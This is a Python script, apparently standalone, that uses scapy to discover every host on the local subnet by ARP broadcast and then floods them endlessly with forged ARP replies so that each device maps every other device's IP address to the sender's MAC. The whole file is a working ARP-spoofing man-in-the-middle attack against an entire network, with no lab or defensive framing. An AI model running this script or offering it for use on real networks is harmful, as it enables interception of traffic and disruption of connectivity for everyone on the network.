from scapy.all import *
import time

network = "enp0s3"

myIp = get_if_addr(network)
myMac = get_if_hwaddr(network)

ipRange = myIp.rsplit('.', 1)[0] + ".1/24"

arp = ARP(pdst=ipRange)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp

responses = srp(packet, timeout=3, iface="enp0s3")[0]
devices = []
for sent, received in responses:
    if (received.psrc != myIp):
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

print("devices in the network")
print("ip" + " "*18+"MAC")
for device in devices:
    print("{:16} {}".format(device['ip'], device['mac']))

spoofPacket = []
for device1 in devices:
    for device2 in devices:
        if (device1 != device2):
            arp = Ether() / ARP ()
            arp[Ether].src = myMac
            arp[ARP].hwsrc = myMac
            arp[ARP].psrc = device2['ip']
            arp[ARP].hwdst = device1['mac']
            arp[ARP].pdst = device1['ip']
            spoofPacket.append(arp)

while True:
    for packet in spoofPacket:
        sendp(packet, iface=network)
    time.sleep(3)
